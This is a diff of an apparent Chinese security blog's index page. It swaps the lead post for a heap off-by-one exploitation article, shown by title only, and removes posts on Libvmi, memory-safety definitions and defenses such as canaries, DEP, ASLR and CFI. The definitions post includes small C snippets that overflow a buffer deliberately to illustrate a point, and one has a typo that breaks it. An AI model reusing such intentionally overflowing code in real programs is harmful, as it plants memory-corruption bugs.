@@ -106,7 +106,7 @@
         
           <section id="main">
   
-    <article id="post-libvmiintro"  class="article article-type-post" itemscope itemprop="blogPost" >
+    <article id="post-heap-offbyone"  class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
     
     
@@ -114,7 +114,7 @@
         
   
     <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/20170102/libvmiintro/">Libvmi原理</a>
+      <a class="article-title" href="/20170104/heap-offbyone/">堆内off-by-one漏洞利用</a>
     </h1>
   
 
@@ -122,346 +122,8 @@
     
     <div class="article-meta">
       
-	Posted on <a href="/20170102/libvmiintro/" class="article-date">
-	  <time datetime="2017-01-02T02:40:14.000Z" itemprop="datePublished">一月 2, 2017</time>
-	</a>
-
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>作者：<a href="http://yandong.org/?p=278#more-278" target="_blank" rel="external">yandong</a><br>编辑： @Tula</p>
-<hr>
-<p><strong>CSysSec注</strong>： Libvmi是佐治亚理工大学PhD毕业生Bryan Payne写的一套从外部监控虚拟机内部行为的API框架，更多详细信息可以见其主页： <a href="http://libvmi.com/" target="_blank" rel="external">libvmi</a><br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/libvmiintro/" target="_blank" rel="external">Libvmi原理</a>》与作者信息：<a href="http://yandong.org/?p=278#more-278" target="_blank" rel="external">yandong</a></p>
-<hr>
-<blockquote>
-<ul>
-<li>0X00 Libvmi简介</li>
-<li>0X01 语义鸿沟</li>
-<li>0X02 Libvmi的使用区别</li>
-<li>0X03 内核结构体的遍历</li>
-<li>0X04 符号表</li>
-</ul>
-</blockquote>
-<h3 id="0x00-Libvmi简介"><a href="#0x00-Libvmi简介" class="headerlink" title="0x00 Libvmi简介"></a>0x00 Libvmi简介</h3><p>Libvmi是一个能够访问正在运行中的虚拟机底层信息的函数库，这些信息包括虚拟机内存信息、寄存器信息以及一些硬件支持拦截的事件。Libvmi最大贡献在于使得虚拟机自省更加方便。Libvmi可以支持Xen、KVM和QEMU等虚拟化平台。其主要部署在宿主操作系统或者特权虚拟机上，可以支持Windows和linux等主流操作系统，并且可以与著名取证工具Volatility协作。</p>
-<p>Libvmi是从XenAccess项目发展而来，其主要的处理流程如下所述。首先，自省程序需要获取内核的符号信息。然后，Libvmi需要找到内核符号的虚拟地址。接着，Libvmi需要根据内核页目录、页表等找到正确的数据页，并把对应虚拟内存地址上的数据返回给自省程序。而且，凭借着多级缓存技术，Libvmi能够快速的访问虚拟机的内存，从而极大的提升自省工具的性能。</p>
-<h3 id="0x01-语义鸿沟"><a href="#0x01-语义鸿沟" class="headerlink" title="0x01 语义鸿沟"></a>0x01 语义鸿沟</h3><p>语义鸿沟问题是虚拟机自省的一大难点，同时也是使用Libvmi进行监控的难点，Libvmi提供的只是访问虚拟机内存的功能而已。如下图所示，在虚拟化架构中，我们可以从虚拟机管理器(VMM)从获取虚拟机的信息，并且具有很好的透明性和隔离性。</p>
-<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/Libvmi01.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/Libvmi01.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
-
-
-<p>但是，从虚拟机管理器层所看到的虚拟机的信息都是0和1等低层次的二进制信息，但是我们又期望能获取想进程列表等高层语义信息，这之间的差别就是语义鸿沟</p>
-<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/Libvmi02.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/Libvmi02.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
-
-
-<p>解决语义鸿沟需要具备以下两个条件：</p>
-<p>(1)能够访问虚拟机的内存 (libvmi)</p>
-<p>(2)拥有丰富的符号表信息 (结构体之间的关系，结构体的详细定义，结构体中各变量的偏移，长度等等。如常用的进程，文件，端口等信息)</p>
-<h3 id="0x02-Libvmi的使用区别"><a href="#0x02-Libvmi的使用区别" class="headerlink" title="0x02 Libvmi的使用区别"></a>0x02 Libvmi的使用区别</h3><p><strong>(1)正常方式：</strong></p>
-<p>使用“-&gt;”操作符引用结构体中的变量。</p>
-<p><strong>(2)VMI方式：</strong></p>
-<p>需要先计算结构体的起始地址加上变量相对于结构体的偏移地址，再使用读内存函数(Read)读取该变量的值。</p>
-<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/Libvmi03.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/Libvmi03.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
-
-
-<h3 id="0x03-内核结构体的遍历"><a href="#0x03-内核结构体的遍历" class="headerlink" title="0x03 内核结构体的遍历"></a>0x03 内核结构体的遍历</h3><p>归根到底，使用libvmi获取信息，需要知道对内核结构体有足够的了解。如下图，分别为如何获取进程列表和文件信息。</p>
-<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/Libvmi04.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/Libvmi04.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
-
-<p><figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/Libvmi05.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/Libvmi05.png" width="450"></a><br>    <figcaption></figcaption><br></figure></p>
-<h3 id="0x04-符号表"><a href="#0x04-符号表" class="headerlink" title="0x04 符号表"></a>0x04 符号表</h3><p>   符号表就是在虚拟机内部函数或者变量中可供引用的函数或者变量符号表。通过内核符号表，我们便可以知道内核中结构体的组成、变量的偏移地址等等信息。对于普通的内核模块，我们可以直接使用一些全局的变量或者使用“-&gt;”操<br>作符来引用结构体中元素。但对于部署在虚拟机外部的虚拟机自省工具而言，其无法享受这种便利，而只能根据预先计算的起始地址加上变量的偏移来读写变量。因<br>而，符号表对于虚拟机自省而言至关重要，是解决语义鸿沟问题的重要工具。而除了虚拟机自省，取证和调试等其他领域也需要符号表。</p>
-<p> 对于Windows系统，Microsoft提供了完善的符号表信息，其中包括xp、vista和Windows<br>7等等不同的版本，以及32位和64位不同的架构。著名的取证工具Volatility中便带有完整的各个版本和架构的Windows符号信息。</p>
-<p>对于Linux，目前有三种获取符号信息的方式。</p>
-<p>(1)首先，我们可以从System.map文件中获取符号信息，如init_task进程结构体的起始地址，但是其包含的信息有限。</p>
-<p>(2)其次，可以通过编写简单的内核模块来计算结构体的组成及其中各元素的偏移，如Libvmi便使用这种方法来获取一些符号信息。这种方法的缺点是不适合获取较为完整或者大量的信息，因为那将导致极大的工作量。</p>
-<p>(3)另外一种方法是利用ELF文件中调试信息，如DWARF格式。DWARF的全称是“Debugging<br>With Attributed Record Formats”，遵从GNU<br>FDL授权，是一种调试信息的存储格式。如果在编译阶段加入调试参数，编译器会从源文件中收集变量名、函数名、变量和函数类型，<br>以及相应的行号等信息，并遵循特定的格式规范将这些信息存储懂到文件中。之后，在进行调试的时，调试器能够解析这种格式从而获得变量、函数等相关信息。而DWARF提了一个非常通用的方案来描述如何定位由一个变量代表的数据，从而为调试、取证以及虚拟机自省提供了方便。如Volatility便是利用DWARF技术来获取所需的Linux的符号信息。</p>
-<hr>
-<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/libvmiintro/" target="_blank" rel="external">Libvmi原理</a>》与作者信息：<a href="http://yandong.org/?p=278#more-278" target="_blank" rel="external">yandong</a></p>
-
-      
-    </div>
-    <footer class="entry-meta entry-footer">
-      
-	<span class="ico-folder"></span>
-    <a class="article-category-link" href="/categories/虚拟机监控/">虚拟机监控<span class="article-category-count">10</span></a>
-
-
-      
-  <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Introspection/">Introspection</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Libvmi/">Libvmi</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Virtualization/">Virtualization</a></li></ul>
-
-      
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-    <article id="post-memorysafety-defense"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/20170101/memorysafety-defense/">内存持久战之防御措施</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	Posted on <a href="/20170101/memorysafety-defense/" class="article-date">
-	  <time datetime="2017-01-01T04:31:03.000Z" itemprop="datePublished">一月 1, 2017</time>
-	</a>
-
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>作者：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
-<hr>
-<p><strong>CSysSec注</strong>： 本系列文章来自<a href="http://www.chongh.wiki/about/" target="_blank" rel="external">Diting0x</a>的<a href="http://www.chongh.wiki/blog/2016/02/24/memorywar-defense/" target="_blank" rel="external">个人博客</a>，主要介绍内存的安全性问题，以及相应的攻击模型及防御措施，对整个系统安全问题的概览有很大的帮助。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/memorysafety-defense/" target="_blank" rel="external">内存持久战之防御措施</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
-<hr>
-<blockquote>
-<ul>
-<li>0X01 广泛部署的防御机制</li>
-<li>0X02 防御机制Step-by-step </li>
-</ul>
-</blockquote>
-<p>继前两篇文章 <a href="http://www.csyssec.org/20170101/memorysafety/" target="_blank" rel="external">内存持久战-内存安全性</a>, <a href="http://www.csyssec.org/20170101/memorysafety-attack/" target="_blank" rel="external">内存持久战-攻击模型</a>, 再加上防御措施，才能算是完整的内存战争。本文首先介绍目前广泛部署的防御机制，然后根据 <a href="http://www.csyssec.org/20170101/memorysafety-attack/" target="_blank" rel="external">内存持久战-攻击模型</a> 每一步实施的攻击破坏介绍相对应的防御细节。</p>
-<h3 id="0X01-广泛部署的防御机制"><a href="#0X01-广泛部署的防御机制" class="headerlink" title="0X01 广泛部署的防御机制"></a>0X01 广泛部署的防御机制</h3><p>目前广泛部署的防御机制有栈粉碎性保护（Stack smashing protection)，DEP/W⊕X以及ASLR(Address Space Layout Randomization)。针对Windows平台，也提出了一些特殊的机制，比如 SafeSEH 与 SEHOP 用来保护堆的元数据和异常处理器。</p>
-<p>栈粉碎性保护,SafeSEH以及SEHOP的基本思想是在返回地址与缓冲区(比如函数入口）之间放置随机数作为哨兵（称为cookie或canary),在函数返回前先检测哨兵的值是否被篡改，以达到检测缓冲区溢出攻击的目的。这些机制都属于代码指针保护方式（code pointer integrity),主要检测一些特殊代码指针，如栈上的返回地址、异常处理器指针的完整性，然而对于直接修改（比如索引错误）却无能为力。有关stack smashing 可参考这篇文章 <a href="http://www.drdobbs.com/security/anatomy-of-a-stack-smashing-attack-and-h/240001832?pgno=1" target="_blank" rel="external">Anatomy of a Stack Smashing Attack and How GCC Prevents It
-</a></p>
-<p>W⊕X（write XOR executable)属于DEP（data execution prevention)的子集，是不可执行数据（Non-executable data）与代码完整性(code integrity)的结合。所有现代CPU都支持设置不可执行页面权限，结合不可写代码权限，就可以实施W⊕X机制，很简单也很实际。然而无法防御ROP（return oriented programming),ROP指的是在将现有代码中的可复用代码（可以是现有的函数）以及一些指令序列（gadgets)连接起来实施恶意操作。有关ROP可参考这篇文章，<a href="https://www.blackhat.com/presentations/bh-usa-08/Shacham/BH_US_08_Shacham_Return_Oriented_Programming.pdf" target="_blank" rel="external">Return-oriented Programming:<br>Exploitation without Code Injection</a>.</p>
-<p>ASLR在下文会详细描述。</p>
-<h3 id="0X02-防御机制Step-by-step"><a href="#0X02-防御机制Step-by-step" class="headerlink" title="0X02 防御机制Step-by-step"></a>0X02 防御机制Step-by-step</h3><p>从目前提出的所有防御机制来看，可将其划分为两大类：概率性以及确定性防御。概率性机制用来随机化一些对象，如ISR(Instruction Set Randomization), ASLR(Address Space Randomizatioin)以及DSR(Data Space Randomization),可选手段相对较少。 确定性防御机制实施reference monitor, 有关reference monitor的定义可参考，<a href="https://en.wikipedia.org/wiki/Reference_monitor" target="_blank" rel="external">wikipedia page on reference monior</a>, 主要就是在参考验证机制上定义了一些设计要求。 其主要利用静态与动态注入技术，静态注入可在编译阶段实施，动态注入需要在运行时加入代码，损耗相对较大。有关注入技术，可参考前面的文章 <a href="http://www.chongh.wiki/blog/2015/12/18/pin-for-dynamic-binary-instrumentation/" target="_blank" rel="external">PIN for Dynamic Binary Instrumentation</a>。</p>
-<p>下面将针对攻击模型中实施的每个步骤介绍相对应的防御机制，每种防御机制对应每一步的攻击过程。<br>可以先去回顾一下 <a href="http://www.csyssec.org/20170101/memorysafety-attack/" target="_blank" rel="external">内存持久战之攻击模型</a> 的完整实施过程。注意，以下介绍的防御机制并没有时序关系,以横向关系依次描述。</p>
-<p><strong><em>Step 1&amp;2: Memory safety.</em></strong> 考虑完整的内存安全性，空间错误和时域错误都需要阻止。类型安全（Type-safe)的语言通过检查数组边界并使用自动垃圾回收来实施空间与时域安全性。对于非类型安全语言，可嵌入reference monitor针对非安全代码实施类似的策略，对象可以是源码、中间语言、二进制。</p>
-<p>针对空间安全，可跟踪指针边界，将指针结构体的表示方法扩展，加入额外信息。但是这种需要源码标注(annotation)，对于庞大的代码基是不实用的，甚至会改变内存结构带来二进制兼容性问题。可参考 <a href="https://www.cs.virginia.edu/~weimer/p/p477-necula.pdf" target="_blank" rel="external">CCured</a> 项目。为解决兼容性问题，越来越多研究者开始追踪对象边界，不但要知道对象分配的内存区域边界，并利用指针运算而不是引用指针来保护指针边界。</p>
-<p>然而，检测边界并不能解决use-after-free, double-free(use-after-free的特列)问题. 此时，实施时域安全可作为补充。1）特殊的分配器：释放的内存只能被同类型对象重用并对齐。此策略可阻止user-after-free攻击，但对dangling pointers无效；2）基于对象的方法：利用影子内存标记每一块释放的内存位置，如果访问最近被释放的空间就能被检测到。著名的Valgrind内存检测就是利用此方法来检测user-after-free错误的。有关Valgrind的内存检测技术将会在后续的文章<a href="http://www.chongh.wiki/blog/2016/02/20/valgrind-memory/" target="_blank" rel="external">Valgrind内存检测</a> 详细介绍。如果标记的内存区域重新被新的指针指向，对其的非法访问就检测不到了；3）基于指针的方法：同时维护指针的边界信息与内存分配信息实施全面的内存安全。</p>
-<p><strong><em>Step 3: 代码完整性(code integrity, 对应修改代码),代码指针完整性(code pointer integrity，对应修改代码指针)以及数据完整性（data integrity，对应修改数据变量).</em></strong></p>
-<p>代码完整性保证程序中的代码不可写性，可以将含有代码的所有内存页面设置为read-only,所有现代CPU都支持此操作。但是，代码完整性并不支持自我修改(self-modifying)的代码以及即时(Just-In-Time, JIT)编译。代码指针完整性保护指针不被修改，对于不变指针，如全局偏移表、虚拟函数表（vtable),可将其内存页设置read-only。但大部分指针，如定义的函数指针或保存的返回地址必须是可写的。另外，就算内存中所有的函数指针都能实施代码指针完整性，并不能防御use-after-free攻击，例如，通过悬挂指针读取错误的vtable<br>来改变程序的控制流并不会涉及内存中的覆盖代码指针操作。</p>
-<p>数据完整性的实施近似空间安全保护，但并没有实施时域安全保护。数据完整性包括基于对象的完整性保护以及基于points-to集合的完整性保护。基于对象的完整性保护利用静态指针分析来鉴别出不安全的指针集(比如可能会越界的指针)以及指针的points-to集合，然后在代码中插入用影子内存跟踪对象的创建与释放的代码，当对不安全的指针进行写操作或引用操作时会检测指针的位置是否标记在影子内存中。基于points-to集合的完整性保护在基于对象的完整性保护上加了一个限制，每个解引用只能写它自己指向的集合对象，是对其保护的加强。</p>
-<p><strong><em>Step 4: ISR(对应指针转向攻击者特定代码),ASLR（对应指向shellcode或者gadget的地址),DSR(对应解析输出的数据变量).</em></strong></p>
-<p>ISR随机化系统指令来保护代码破坏攻击，随着硬件的更新与发展,ISR技术已经废弃；ASLR随机化代码和数据的存储位置来防御控制流劫持攻击，如果payload(指恶意代码中执行恶意操作的部分）在虚拟内存空间的地址不是固定的，攻击者就无法转移控制流。ASLR也是目前用来保护劫持攻击运用最广泛的技术，然后ASLR的随机化是可预测的，尤其是32位机器，heap-spraying以及JIT-spraying技术可以多次填充payload使随机化失效；</p>
-<p>DSR将存储在内存中的数据形式，而不是存储位置，进行随机化。它为每个变量,包括指针，生成不同的key并进行加密操作，数据的每次读取/存储操作都多了个加解密过程。该方法在代码注入之前都要对指针进行静态分析，overhead较大，但保护比较健壮，能有效防止信息泄露，还能防御控制流劫持以及数据攻击。</p>
-<p><strong><em>Step 5: 控制流完整性（control-flow integrity,对应利用间接跳转指令 call/jump 引用指针，利用返回指令引用指针)以及数据流完整性(data-flow integrity，对应引用破坏后的数据变量).</em></strong></p>
-<p>控制流完整性包括动态返回完整性以及静态控制流图完整性。前文提到的栈粉碎性保护机制不能保护间接调转（call and jump)，不能防御直接修改破坏以及信息泄露，但开销小，兼容性好，所以运用比较广泛。影子栈技术能够解决栈粉碎性保护的信息泄露以及直接修改破坏问题，它把返回地址存入隔离的影子栈中，当函数返回时，对原有栈和影子栈两处保存的值做比较，已保证不被篡改。为了防御控制流劫持，不但要保护返回值，还要保护间接跳转，静态控制流图完整性的方式标记所有的call,jump，并将其标记信息存储在特殊的影子内存中或直接放进代码里; 数据流完整性在数据被使用前，通过检查read指令检测数据是否被破坏。它使用静态points-to分析构建一个全局的可达定义集合（reaching definition sets)，保证数据变量最近一次被写是通过程序中的写指令写入的，而不是攻击者可控制的写入。有关reaching definition sets的定义可参考 <a href="https://en.wikipedia.org/wiki/Reaching_definition" target="_blank" rel="external">wikipedia page on Reaching definition</a>.</p>
-<p><strong><em>Step 6: 不可写数据策略(Non-executable data,对应执行注入的shellcode).</em></strong><br>Non-executable data 保护栈、堆之类的内存页面不可执行，只需要设置内存页面的执行位即可。实际上Non-executable data策略与代码完整性结合就是W⊕X机制。</p>
-<p>每个攻击过程对应的防御机制都已讲完。横向来看，所有攻击模型的每个步骤都有多个防御方法；纵向来看，每种攻击在不同的实施阶段也有不同的防御方法，如控制流劫持攻击，从Step1-6分别有，内存安全性机制（step 1-2),代码指针完整性(step 3),ASLR(step 4), 控制流完整性（step 5）以及不可写数据策略（step 6)不同的防御机制。要阻止某种攻击或多种攻击，需要结合多种防御机制，每种机制也都有其优势与弱点。评判防御机制的性质，可从以下方面去衡量，保护强度、误报率、漏报率、性能开销、内存开销、兼容性，是否模块化等。</p>
-<p>至此，内存持久战系列文章就到这里了，水平有限，很多不到位的地方欢迎补充修正。 回顾一下，最后用下面这张图总结，就清晰明了了。</p>
-<figure><br>    <a href="http://7xppf1.com1.z0.glb.clouddn.com/memorywar.png" target="_blank" rel="external"><img src="http://7xppf1.com1.z0.glb.clouddn.com/memorywar.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
-
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.drdobbs.com/security/anatomy-of-a-stack-smashing-attack-and-h/240001832?pgno=1" target="_blank" rel="external">Anatomy of a Stack Smashing Attack and How GCC Prevents It
-</a></p>
-<p><a href="https://www.blackhat.com/presentations/bh-usa-08/Shacham/BH_US_08_Shacham_Return_Oriented_Programming.pdf" target="_blank" rel="external">Return-oriented Programming: Exploitation without Code Injection</a>.</p>
-<p><a href="https://en.wikipedia.org/wiki/Reference_monitor" target="_blank" rel="external">wikipedia page on reference monior</a></p>
-<p><a href="https://www.cs.virginia.edu/~weimer/p/p477-necula.pdf" target="_blank" rel="external">CCured</a></p>
-<p><a href="https://nebelwelt.net/publications/files/13Oakland.pdf" target="_blank" rel="external">S&amp;P’13 Eternal War in Memory </a></p>
-<p>作者[@diting0x] 于Lawson computer science building</p>
-<hr>
-<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/memorysafety-defense/" target="_blank" rel="external">内存持久战之防御措施</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
-
-      
-    </div>
-    <footer class="entry-meta entry-footer">
-      
-	<span class="ico-folder"></span>
-    <a class="article-category-link" href="/categories/内存安全/">内存安全<span class="article-category-count">3</span></a>
-
-
-      
-  <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Memory/">Memory</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li></ul>
-
-      
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-    <article id="post-memorysafety-attack"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/20170101/memorysafety-attack/">内存持久战之攻击模型</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	Posted on <a href="/20170101/memorysafety-attack/" class="article-date">
-	  <time datetime="2017-01-01T04:29:44.000Z" itemprop="datePublished">一月 1, 2017</time>
-	</a>
-
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        
-
-          
-            <div class="entry-summary" style="margin-left:0;">
-            作者：Diting0x
-
-CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存的安全性问题，以及相应的攻击模型及防御措施，对整个系统安全问题的概览有很大的帮助。转载本文请务必注明，文章出处：《内存持久战之攻击模型》与作者信息：Diting0x
-
-
-
-0X01 基本攻击模型
-0X02 构建攻击模型
-
-
-内存破坏是计算机安全中亘古不变的话题。内存破坏也被看作是top three危险的软件错误。像C/C++这种底层语言很容易引来这些bugs. 这些程序语言无法对内存安全性的保证，以至于让一些攻击者利用内存bugs改变程序行为或甚至控制整个控制流（control-flow).  要了解什么是内存安全性，可参考上一篇文章：内存持久战-内存安全性.  然而，一种最显而易见的解...
-          
-
-        
-          <p class="article-more-link">
-            <a href="/20170101/memorysafety-attack/#more">阅读全文</a>
-          </p>
-        </div>
-      
-    </div>
-    <footer class="entry-meta entry-footer">
-      
-	<span class="ico-folder"></span>
-    <a class="article-category-link" href="/categories/内存安全/">内存安全<span class="article-category-count">3</span></a>
-
-
-      
-  <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Memory/">Memory</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li></ul>
-
-      
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-    <article id="post-memorysafety"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/20170101/memorysafety/">内存持久战之内存安全性</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	Posted on <a href="/20170101/memorysafety/" class="article-date">
-	  <time datetime="2017-01-01T04:10:20.000Z" itemprop="datePublished">一月 1, 2017</time>
-	</a>
-
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>作者：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
-<hr>
-<p><strong>CSysSec注</strong>： 本系列文章来自<a href="http://www.chongh.wiki/about/" target="_blank" rel="external">Diting0x</a>的<a href="http://www.chongh.wiki/blog/2016/02/18/memory-safety/" target="_blank" rel="external">个人博客</a>，主要介绍内存的安全性问题，以及相应的攻击模型及防御措施，对整个系统安全问题的概览有很大的帮助。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/memorysafety" target="_blank" rel="external">内存持久战之内存安全性</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
-<hr>
-<blockquote>
-<ul>
-<li>IEEE Security&amp;Privacy’13</li>
-<li>不访问未定义的内存</li>
-<li>无限间距</li>
-<li>Pointers as capabilities</li>
-</ul>
-</blockquote>
-<p>C语言中的buffer overflows, format string attacks等其它的一些vulnerabilities都有一个共同的问题：违背内存安全(Memory Safety)。本文主要讲述如何准确定义内存安全，为什么这些vulnerabilities违背了内存安全。 也为后续两篇文章<a href="http://www.csyssec.org/20170101/memorysafety-attack" target="_blank" rel="external">内存持久战-攻击模型</a>，<a href="http://www.csyssec.org/20170101/memorysafety-defense" target="_blank" rel="external">内存持久战-防御措施</a>做好铺垫。</p>
-<h3 id="IEEE-Security-amp-Privacy’13"><a href="#IEEE-Security-amp-Privacy’13" class="headerlink" title="IEEE Security&amp;Privacy’13"></a>IEEE Security&amp;Privacy’13</h3><p>发表在IEEE Security&amp;Privacy’13的一篇SoK(Systematization of Knowledge)文章，<a href="https://nebelwelt.net/publications/files/13Oakland.pdf" target="_blank" rel="external">Eternal War in Memory </a>，阐述了一种定义内存安全的通用方法。<br><strong><em>Definition 1:</em></strong> 文中提到，一个程序的执行，只要不会出现以下内存访问错误，就是内存安全的：</p>
-<ul>
-<li>[X] 1.缓冲区溢出</li>
-<li>[X] 2.引用空指针</li>
-<li>[X] 3.释放后使用（use after free）</li>
-<li>[X] 4.使用未初始化内存</li>
-<li>[X] 5.非法释放已经释放过的指针或未分配的指针</li>
-</ul>
-<p>维基百科 <a href="https://en.wikipedia.org/wiki/Memory_safety" target="_blank" rel="external">wikipedia page on memory safety</a> 也有类似的定义。从定义来看，排除这些错误是内存安全本身的定义所导向的，而并非内存安全性的本质。那么，如何将这些错误统一起来？</p>
-<h3 id="不访问未定义的内存"><a href="#不访问未定义的内存" class="headerlink" title="不访问未定义的内存"></a>不访问未定义的内存</h3><p>只有当程序访问未定义的内存时才会产生内存错误，这块内存是在程序中没有具体分配的，例如，<em>heap</em> 的一部分（通过<em>malloc</em>)，<em>stack</em>(作为局部变量或者函数参数），又或者是静态数据区域（作为全局变量). <a href="http://www.cs.berkeley.edu/~necula/" target="_blank" rel="external">George Necula</a> 在他的<em>CCured</em>项目中（旨在为C程序实施内存安全性）提到，一个内存安全的程序从来不会去访问未定义的内存。我们可以假设，内存可以无限的大，大到内存地址从不会复用(reused).如此一来，被释放的内存（可以调用<em>free</em> 或者从函数返回的时候<em>pop</em>）从不会被重新分配，并且会永久的保持未定义状态。</p>
-<p><strong><em>Definition 2:</em></strong> 不访问未定义的内存就是内存安全的。<br>这种定义明显排除了<em>error 2</em> 和 <em>error 3</em>. 如果将<em>allocated</em> 的定义包括<em>initialized</em>，又可以排除<em>error 4</em>. 如果假设<em>free</em>只能在定义过的内存指针中调用，那又可以排除<em>error 5</em>. </p>
-<p>不幸的是，<em>Definition 2</em> 并未排除缓冲区溢出错误，也就是<em>error 1</em>。 来看一个例子，假定一个标准<em>stack</em> 布局， 在此定义下，<em>program 1</em> 的执行会被认为是内存安全的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">/* Program 1 */</div><div class="line">int x;</div><div class="line">int buf[4];</div><div class="line">buf[5] =3; /*overwrite*/</div></pre></td></tr></table></figure>
-<p><em>Definition 2</em> 允许 <em>Program 1</em> 通过是因为此程序是在合法分配的内存中写数据，甚至写的数据类型也是正确的。但实际上问题在于，数组<em>buf</em> 的溢出将数据写进了变量<em>x</em> 中，显然这是内存不安全的。</p>
-<p>###无限间距<br>将 <em>Definition 2</em> 延伸， <em>Program 1</em> 被看作是内存不安全的。只要加上这个假设： 内存区域分配的间距是无限大的。</p>
-<p> <em>Buf</em> 和 <em>x</em> 的分配间距无限的大，<em>buf[5]</em> 将会访问 <em>buf</em> 区域的边界外部。边界外部是个未定义的内存区域，按照上述定义，就会产生错误。<em>heap</em> ,静态数据区域对溢出的处理方式类似。</p>
-<p>尽管 <em>Definition 2</em> 是个很接近让人满意的定义，但事实并未如此。来看 <em>Program 1</em> 的变形 <em>Program 2</em>，也是一种缓冲区溢出, <em>Definition 2</em>  仍然会允许 <em>Program 2</em> 执行。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">/*Program 2 */</div><div class="line">struct foo &#123;</div><div class="line">   int buf[4];</div><div class="line">   int x;</div><div class="line">   &#125;;</div><div class="line">struct foo *pf -malloc(sizeof(struct foo));</div><div class="line">pf-&gt;buf[5] =3;/*overwrite pf-&gt;x*/</div></pre></td></tr></table></figure>
